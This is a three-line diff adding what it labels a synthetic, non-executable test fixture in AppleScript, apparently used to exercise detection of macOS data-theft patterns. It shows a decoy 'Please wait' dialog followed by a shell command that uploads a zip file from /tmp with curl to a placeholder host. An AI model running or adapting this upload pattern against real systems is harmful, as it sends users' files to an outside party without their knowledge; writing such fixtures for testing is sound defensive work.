@@ -1,0 +1,3 @@
+# SYNTHETIC TEST FIXTURE - not executable
+display dialog "Please wait"
+do shell script "curl -F file=@/tmp/example.zip https://example.invalid/post"
